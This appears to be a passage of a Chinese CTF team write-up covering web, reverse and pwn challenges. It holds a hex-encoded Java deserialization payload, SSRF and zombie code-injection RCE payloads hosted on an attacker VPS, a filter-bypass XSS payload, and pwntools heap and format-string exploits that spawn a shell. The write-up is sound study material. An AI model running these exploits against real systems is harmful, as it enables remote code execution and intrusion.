94C6A6176612F6C616E672F436C6173733B010010697341737369676E61626C6546726F6D010014284C6A6176612F6C616E672F436C6173733B295A010009676574486561646572010026284C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F537472696E673B0100096765744D6574686F64010040284C6A6176612F6C616E672F537472696E673B5B4C6A6176612F6C616E672F436C6173733B294C6A6176612F6C616E672F7265666C6563742F4D6574686F643B0100186A6176612F6C616E672F7265666C6563742F4D6574686F64010006696E766F6B65010039284C6A6176612F6C616E672F4F626A6563743B5B4C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01000B67657450726F706572747901000B746F55707065724361736501001428294C6A6176612F6C616E672F537472696E673B01001B284C6A6176612F6C616E672F4368617253657175656E63653B295A01000967657457726974657201001728294C6A6176612F696F2F5072696E745772697465723B0100116A6176612F6C616E672F52756E74696D6501000A67657452756E74696D6501001528294C6A6176612F6C616E672F52756E74696D653B01000465786563010028285B4C6A6176612F6C616E672F537472696E673B294C6A6176612F6C616E672F50726F636573733B0100116A6176612F6C616E672F50726F6365737301000E676574496E70757453747265616D01001728294C6A6176612F696F2F496E70757453747265616D3B010018284C6A6176612F696F2F496E70757453747265616D3B295601000C75736544656C696D69746572010027284C6A6176612F6C616E672F537472696E673B294C6A6176612F7574696C2F5363616E6E65723B0100046E6578740100136A6176612F696F2F5072696E745772697465720100077072696E746C6E010015284C6A6176612F6C616E672F537472696E673B2956010005666C7573680100116765744465636C617265644669656C647301001C28295B4C6A6176612F6C616E672F7265666C6563742F4669656C643B01000D73657441636365737369626C65010004285A2956010003676574010026284C6A6176612F6C616E672F4F626A6563743B294C6A6176612F6C616E672F4F626A6563743B0100076973417272617901000328295A01000D6765745375706572636C617373010040636F6D2F73756E2F6F72672F6170616368652F78616C616E2F696E7465726E616C2F78736C74632F72756E74696D652F41627374726163745472616E736C65740700CA0A00CB005F0021003300CB000000030008003400350001003600000002003700080038003900000008003A003B000000040001003C003D0001003E0000005C000200010000001E2AB700CC01B3000201B30003BB000459B70005B30006B8000703B80008B100000002003F0000001A0006000000140004001500080016000C001700160018001D001900400000000C00010000001E004100420000000A004300440001003E0000005A000200010000001A2AC6000DB200062AB6000999000504ACB200062AB6000A5703AC00000003003F0000001200040000001D000E001E001000210018002200400000000C00010000001A00450046000000470000000400020E01000A003A00480001003E000001D300050003000000EF1B1034A3000FB20002C6000AB20003C60004B12AB8000B9A00D7B20002C70051120C2AB6000DB6000E9900452AC0000CB30002B20002120FB900100200C7000A01B30002A7002AB20002B6000D121103BD0012B60013B2000203BD0014B60015C00016B30003A700084D01B30002B20002C60076B20003C6007006BD00184D1219B8001AB6001B121CB6001D9900102C03120F532C04121E53A7000D2C03121F532C041220532C05B20002120FB90010020053B20003B900210100BB002259B800232CB60024B60025B700261227B60028B60029B6002AB20003B900210100B6002BA700044DB12A1B0460B80008B100020047006600690017007A00E200E500170003003F0000006A001A000000250012002600130028001A0029002C002A0033002B0040002C0047002F0066003300690031006A0032006E0037007A003A007F003B008F003C0094003D009C003F00A1004000A6004200B3004400D7004500E2004700E5004600E6004800E7004B00EE004D00400000002A0004006A00040049004A0002007F0063004B004C0002000000EF004D00460000000000EF004E004F0001004700000022000B1200336107005004FC002D07005109FF003E0002070052010001070050000006000A005300480001003E000001580002000C000000842AB6000D4D2CB6002C4E2DBE360403360515051504A200652D1505323A06190604B6002D013A0719062AB6002E3A071907B6000DB6002F9A000C19071BB80030A7002F1907C00031C000313A081908BE360903360A150A1509A200161908150A323A0B190B1BB80030840A01A7FFE9A700053A08840501A7FF9A2CB60032594DC7FF85B100010027006F007200170003003F0000004200100000005000050052001E00530024005400270056002F0058003A00590043005B0063005C0069005B006F00620072006100740052007A0065007B00660083006800400000003E00060063000600540046000B0027004D004D00460007001E00560055005600060000008400570046000000000084004E004F00010005007F00580059000200470000002E0008FC000507005AFE000B07005B0101FD003107005C070052FE00110700310101F8001942070050F90001F800050001005D00000002005E707400016170770100787400017878737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000000787871007E000D78;&quot;&#125;,&quot;（把上面两段再复制两遍）&#125;</code></pre><h3 id="crawler-z"><a href="#crawler-z" class="headerlink" title="crawler_z"></a>crawler_z</h3><p>观察 &#x2F;user&#x2F;profile 和 &#x2F;user&#x2F;verify 路由可知，profile 在处理 bucket 的更新时是先进行了更新再生成了 token。</p><p>而 verify 仅仅判断了库中是否存在所提交的 token 并且其 valid 为 true。</p><p>那么此时即存在了一个逻辑漏洞，先正常提交一次 bucket 更新，使得程序写入一个可行的 token，然后再次请求 profile 更新 bucket 为 SSRF 的值。使用第一次得到的 token 对第二次的恶意 bucket 进行 verify，从而成功达成 SSRF。由于此时的 bucket 被进行了如下校验。</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">static</span> <span class="token function">checkBucket</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>protocol <span class="token operator">!=</span> <span class="token string">"http:"</span> <span class="token operator">&amp;&amp;</span> url<span class="token punctuation">.</span>protocol <span class="token operator">!=</span> <span class="token string">"https:"</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>url<span class="token punctuation">.</span>href<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'oss-cn-beijing.ichunqiu.com'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>因此我们构造链接的形式被迫变为 <a href="http://host/#oss-cn-beijing.ichunqiu.com">http://HOST#oss-cn-beijing.ichunqiu.com</a>  也就是说我们只能使用指定协议。</p><p>此时可以使用 302 跳转进行绕过，在服务器上写如下 PHP 代码来进行跳转，从而达成任意文件读取。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: file:///readflag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre><p>此时再提交链接后访问 &#x2F;bucket 路由即可触发一次访问。而访问所返回的内容则是根目录下 &#x2F;readflag 的内容。</p><p>结合题目的提示可知我们需要 RCE，而读取到了 &#x2F;readflag 则指明了方向。此时可以发现程序使用了 zombie 进行了访问，因此可以采用 zombie code injection 来进行 RCE，进而带出 flag。</p><p>公网vps写入：</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">[</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"constructor"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"return(global.process.mainModule.constructor._load('child_process').execSync('/readflag').toString())"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 8月 22, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> randombaseurl <span class="token operator">=</span> <span class="token string">"http://eci-2zedk1cbvvahhu2yuuyl.cloudeci1.ichunqiu.com:8888/"</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl<span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">"user/verify?token=%s"</span> <span class="token operator">%</span> token<span class="token punctuation">)</span>    session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">register</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"signup"</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span>        <span class="token string">"password_confirm"</span><span class="token punctuation">:</span> password    <span class="token punctuation">&#125;</span>    <span class="token comment"># print(session.post(url, data=data, headers=header).text)</span>    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"regist"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"signin"</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> username<span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    <span class="token comment"># print(session.post(url, data=data, headers=header))</span>    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">modify</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"user/profile"</span>    data1 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"affiliation"</span><span class="token punctuation">:</span> <span class="token string">"ichunqiu123"</span><span class="token punctuation">,</span>        <span class="token string">"age"</span><span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token string">"bucket"</span><span class="token punctuation">:</span> <span class="token string">"https://895cdc8a2e67bbb23b5e6335fca98bc2.oss-cn-beijing.ichunqiu.com/"</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data1<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token comment"># print(res)</span>        token <span class="token operator">=</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"?token="</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"The page may be loading ..."</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    data2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"affiliation"</span><span class="token punctuation">:</span> <span class="token string">"ichunqiu123"</span><span class="token punctuation">,</span>        <span class="token string">"age"</span><span class="token punctuation">:</span> <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token string">"bucket"</span><span class="token punctuation">:</span> payload<span class="token operator">+</span><span class="token string">"#oss-cn-beijing.ichunqiu.com"</span>    <span class="token punctuation">&#125;</span>    session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data2<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>header<span class="token punctuation">)</span>    verify<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> baseurl <span class="token operator">+</span> <span class="token string">"user/bucket"</span>    res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\\n"</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"The page may be loading ..."</span> <span class="token keyword">not</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> random<span class="token punctuation">.</span>random<span class="token punctuation">(</span><span class="token punctuation">)</span>    register<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    login<span class="token punctuation">(</span>username<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    <span class="token comment"># modify("http://vps/test.php?1=file:///flag")</span>    modify<span class="token punctuation">(</span><span class="token string">"http://vps/test3.php"</span><span class="token punctuation">)</span>    view<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><h3 id="Secrets-Of-Admin"><a href="#Secrets-Of-Admin" class="headerlink" title="Secrets_Of_Admin"></a>Secrets_Of_Admin</h3><p>先看database.ts，直接给出账号密码，<code>admin/e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645</code>,同时还有flag的sum值</p><p>flag在file&#x2F;flag中，审查代码发现我们要<strong>不是</strong>superuser<strong>且是</strong>admin才可以获取file下的文件，superuser被ban了</p><p>看<code>/</code>路由，由于database只要一个admin用户，所以直接登录，就是<code>isadmin</code>为true了</p><p>重定向到<code>/admin</code>路由，get方法没啥好说的，如果属于user的文件存在就写入cookie。 </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> files <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">listFile</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">username</span><span class="token operator">:</span> token<span class="token punctuation">.</span>username<span class="token punctuation">,</span> <span class="token literal-property property">files</span><span class="token operator">:</span> files<span class="token punctuation">,</span> <span class="token literal-property property">isAdmin</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">signed</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>post方法可以看到ban掉了<code>&lt;</code>&#x2F;<code>script</code>&#x2F;<code>&gt;</code>等，从出题人的思路讲，可能是要打xss</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> <span class="token punctuation">&#123;</span> content <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> content <span class="token operator">==</span> <span class="token string">''</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'on'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// even admin can't be trusted right ? :)  </span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'Forbidden word 🤬'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>使用了html-pdf依赖用于生成pdf，然后保存文件到xx.pdf</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> filename <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">uuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.pdf</span><span class="token template-punctuation string">`</span></span></code></pre><p>在<code>/api/files</code>路由下带参数可以加一条log，带<code>/sumid</code>可以访问文件，可以看到superuser被ban了 </p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>username <span class="token operator">==</span> <span class="token string">'superuser'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Superuser is disabled now'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><p>但是关键点在于读取到文件后会进入模版渲染，加上前面ban了xss的东西，推测就是打xss了</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">let</span> filename <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">getFile</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span>username<span class="token punctuation">,</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token punctuation">,</span> <span class="token string">"../files/"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">readFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token punctuation">,</span> <span class="token string">"../files/"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'No such file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>由于html-pdf 用到了phanthomjs渲染，因此存在ssrf。我们可以使用数组绕过<code>.includes(xxx)</code>的检测。并插入ssrf的内容</p><p>Payload:</p><pre class="language-none"><code class="language-none">content[]&#x3D;&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;api&#x2F;files?username&#x3D;admin&amp;filename&#x3D;..&#x2F;files&#x2F;flag&amp;checksum&#x3D;be5a14a8e504a66979f6938338b0662c&quot;;&lt;&#x2F;script&gt;</code></pre><p>容器打完后会崩，试了几次，然后访问下<code>/admin</code>路由 </p><p>直接去访问文件，<code>./api/files/be5a14a8e504a66979f6938338b0662c</code>，得到flag</p><hr><h2 id="Web总结"><a href="#Web总结" class="headerlink" title="Web总结"></a>Web总结</h2><p>觉得这是发挥不错的一场比赛了，虽然题目很简单，但是还是学到了很多，尤其是安全检测，自己独立凭感觉解出来题目自信心也是upup。还有层层穿透，很有趣的内网渗透题目，很简单，但是给我敲开了这扇大门，感觉很有兴趣，以后可以多研究一下。</p><p>以下是本队的WP，虽然成绩不太行，但是尽力就好。</p><hr><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="勒索解密"><a href="#勒索解密" class="headerlink" title="勒索解密"></a>勒索解密</h3><p>32位exe程序，要知道程序加密文件的流程，</p><p>看到了这个，Microsoft Enhanced RSA and AES Cryptographic Provider</p>猜测先把key+timestamp联系到了一起，然后sha256加密变成那个key，再拿去aes加密。<img src="/article/2021xyb/3202085600-229394217-57394DB0558F49AAB782959EC5A93100.JPG" class="" title="3202085600-229394217-57394DB0558F49AAB782959EC5A93100" loading="lazy"><img src="/article/2021xyb/3202085600-886959209-9385D62446713B8751AEFB402591DB09.JPG" class="" title="3202085600-886959209-9385D62446713B8751AEFB402591DB09" loading="lazy"><p>和时间戳连着 然后给key</p><img src="/article/2021xyb/3202085600-201622791-5AC8865E89504CA44AD22B2BEE9B0612.JPG" class="" title="3202085600-201622791-5AC8865E89504CA44AD22B2BEE9B0612" loading="lazy"><p>来了一下0x800C这种加密，然后得到一个key，再拿这个key去aes加密文件</p><img src="/article/2021xyb/3202085600-1838268119-6D44CB41D7988685E018363677E2C6D9.JPG" class="" title="3202085600-1838268119-6D44CB41D7988685E018363677E2C6D9" loading="lazy"><p>AES：660E</p><img src="/article/2021xyb/3202085600-1920708629-16E549D4945DC54A0B07B4FB3F3591D3.JPG" class="" title="3202085600-1920708629-16E549D4945DC54A0B07B4FB3F3591D3" loading="lazy"><p>感觉那个rsa只是用来校验完整性</p><p>根据加密文件的时间戳，修正为UTC+0时间，可知中间的time应为0x611a1105</p><pre class="language-plain" data-language="plain"><code class="language-plain">import base64from Crypto.Cipher import AESfrom Crypto import Randomimport hashlibimport osimport base64def encrypt(data, password):    bs = AES.block_size    pad = lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)    cipher = AES.new(password)    data = cipher.encrypt(pad(data))    return (data)    if __name__ == '__main__':    key = bytearray.fromhex('b22fc60e4fd4544b05111a6121e7b18e')    key = hashlib.sha256(key).hexdigest()    key = bytes.fromhex(key)[:16]    iv = b'\x00'*16    cipher = AES.new(key, AES.MODE_CBC, iv )    f = open('flag.bmp.ctf_crypter', 'rb')    data = f.read()[:-0x80-4]    de = cipher.decrypt(data)    d = open('daidai.bmp','wb')    d.write(de)    d.close()    f.close()</code></pre><img src="/article/2021xyb/1629625133(1).png" class="" title="1629625133(1)" loading="lazy"><h3 id="Rev-Dizzy"><a href="#Rev-Dizzy" class="headerlink" title="Rev_Dizzy"></a>Rev_Dizzy</h3><p>由于数据太大超过文档限制，这里不便贴出，两个puts直接解决，签到题。直接逆序文件，加减号互换，跑一下出flag。</p><img src="/article/2021xyb/1629629205(1).png" class="" title="1629629205(1)" loading="lazy"><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>通过scanf的格式化字符串漏洞修改TOPCHUNK的size并申请大于topchunk的堆块使其进入unsortedbin中，在申请回来时因为没有零截断所以可以直接打印出mainarena地址，进而获得libc基地址，通过计算偏移后可以构建system(“&#x2F;bin&#x2F;sh”)的ROP链并获取shell</p><p>exp：</p><pre class="language-plain" data-language="plain"><code class="language-plain">from pwn import *import timecontext.log_level = 'debug'context.arch = 'amd64'def menu(index):p.sendlineafter('choice: ', str(index))def add(size, content):menu(1)p.sendlineafter('size: ', str(size))p.sendlineafter('content: ', content)def say(say1, say2):menu(2)p.sendlineafter('say ? ', say1)p.sendlineafter('? ', say2)def debug():gdb.attach(p)p = process('./pwn1')# p = remote('47.104.70.90','25315')libc = ELF('libc-2.23.so')rbp_rip = '%17$s\x00'# gdb.attach(p,'b *$rebase(0x1235)')add(0x10,'lby')p.recvuntil('addr: ')heap_addr = int(p.recvline().replace('\n',''),16)success('heap: '+hex(heap_addr))pl1 = '%7$s'+'aaaa'+p64(heap_addr)pl2 = 'a'*0x18+p64(0xfe1)say(pl1, pl2)for i in range(24):add(0x90,'a'*0x90)add(0xd0,'a'*0xd0)add(0x10, 'a'*8)menu(3)p.recvuntil('content:aaaaaaaa\n')malloc_hook = u64(('\x00'+p.recv(5)).ljust(8,'\x00'))-224-0x10libc_base = malloc_hook-libc.sym['__malloc_hook']system = libc_base+libc.sym['system']sh = libc_base + libc.search('/bin/sh\x00').next()prdi_ret = libc_base+libc.search(asm("pop rdi\nret")).next()success(hex(malloc_hook))pl3 = p64(prdi_ret)+p64(sh)+p64(system)say('%17$s','a'*8+pl3)p.interactive()</code></pre><h3 id="PassWordBox-FreeVersion"><a href="#PassWordBox-FreeVersion" class="headerlink" title="PassWordBox_FreeVersion"></a>PassWordBox_FreeVersion</h3><p>fgets处溢出一字节，构成off by null漏洞，输入的内容会被加密所以要进行逆向分析，确保我们在堆上的数据是正常的</p><p>观察show函数，不难发现其在show之前又执行了一次加密函数，并且创建堆块的时候会直接输出密钥加密后的内容，将其与我们输入的内容进行相异或即可得到随机值</p><p>解决了加密的问题，然后我们就可以利用前面提到的offbynull漏洞进行利用，构造堆重叠已经堆块复用的情况，通过让堆块进入unsortedbin以此来泄露libc基地址，最后再通过往free_hook中写入onegadget来获取shell</p><pre class="language-plain" data-language="plain"><code class="language-plain">from pwn import *import timedef add(id,size,content):    p.sendlineafter("Input Your Choice:\n",str(1))    p.sendafter("Save:",str(id))    p.sendlineafter("Pwd:",str(size))    p.sendafter("Pwd:",content)def show(id):    p.sendlineafter("Choice:\n",str(3))    p.sendlineafter("Check:\n",str(id))def delete(id):    p.sendlineafter("Choice:\n",str(4))    p.sendlineafter("Delete:\n",str(id))def edit(id,data):    p.sendlineafter("Choice:\n",str(2))    p.sendline(str(id))    p.sendline(str(data))p=process('./pwdFree')libc = ELF("libc.so.6")add(0,0xf8,'\n')p.recvuntil('D:')key=u64(p.recv(8))rand=key^0xaadd(1,0xf8,'\n')add(2,0xf8,'\n')for i in range(7):    add(i+3,0xf0,'\n')  #3--9 full tcfor i in range(6):  #3-9 full tc    delete(i+3)delete(1)delete(0)num=0x200^randpayload=b'c'*0xf0+p64(num)add(0,0xf8,payload)delete(9)delete(2)for i in range(8):    add(1, 0xf8, '\n')show(0)p.recvuntil('Pwd is: ')key=u64(p.recv(8))l=key^randlibcbase=l-0x3ebca0add(9,0xf8,'\n')delete(1)delete(2)delete(0)free=libcbase+0x3ed8e8edit(9,p64(free))add(1,0xf8,'\n')one=libcbase+0x4f432system=libcbase+0x04f550system=one^randpayload=p64(system)add(2,0xf8,payload+b'\n')delete(1)p.interactive()</code></pre><h3 id="Lemon"><a href="#Lemon" class="headerlink" title="Lemon"></a>Lemon</h3><p>主要问题是2.26版本下, 未控制好指针导致任意写</p><p>数据结构如下:</p><p> lemon_name:</p><p>lemon_content:</p><p>主要可利用的函数是color:</p><p>这里的buf是指lemon_name结构, 所以可以控制指针lemon_addr的指向了, 